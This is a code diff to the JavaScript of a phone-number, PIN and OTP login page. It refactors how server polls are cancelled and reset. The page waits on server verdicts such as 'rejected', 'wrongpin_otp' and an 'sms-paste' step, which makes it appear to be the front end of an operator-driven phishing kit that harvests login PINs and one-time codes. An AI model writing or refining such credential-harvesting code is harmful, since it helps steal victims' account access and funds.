@@ -856,11 +856,6 @@
       const idx = parseInt(id[2]);
       if (idx > 0) document.getElementById('lp' + (idx-1)).focus();
     }
-
-    if (id.startsWith('otp') && !id.startsWith('otpPin') && e.key === 'Backspace' && !e.target.value) {
-      const idx = parseInt(id[3]);
-      if (idx > 0) document.getElementById('otp' + (idx-1)).focus();
-    }
   });
 
   function chkPin() {
@@ -992,12 +987,11 @@
             goTo('page-sms-paste');
 
           } else if (data.status === 'rejected') {
-            clearTimeout(pollTimeout);
+            cancelAllPolls();
+            S.applicationId = '';
             document.getElementById('lpPhone').value = '';
             [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
             goTo('page-login');
-            document.getElementById('bLgn').disabled = false;
-            chkPin();
             showLgnMsg('error', 'Your login credentials were invalid. Please try again.');
 
           } else {
@@ -1342,7 +1336,10 @@
 
           } else if (status === 'wrongpin_otp') {
             // ❌ Wrong PIN detected at OTP stage — send user all the way back to login
-            clearTimeout(otpPollTimeout);
+            cancelAllPolls();
+
+            // Reset application ID so stale polls can't match
+            S.applicationId = '';
 
             // Clear all sensitive fields
             document.getElementById('lpPhone').value = '';
@@ -1354,12 +1351,8 @@
             document.getElementById('bOtp').disabled = false;
             document.getElementById('bOtp').textContent = 'SUBMIT';
 
-            // Navigate back to login
+            // Navigate back to login (goTo resets bLgn, spinner, isSubmitting)
             goTo('page-login');
-
-            // Reset login button
-            document.getElementById('bLgn').disabled = false;
-            chkPin();
 
             // Show error message on login page
             showLgnMsg('error', 'Your PIN was incorrect. Please re-enter your credentials.');
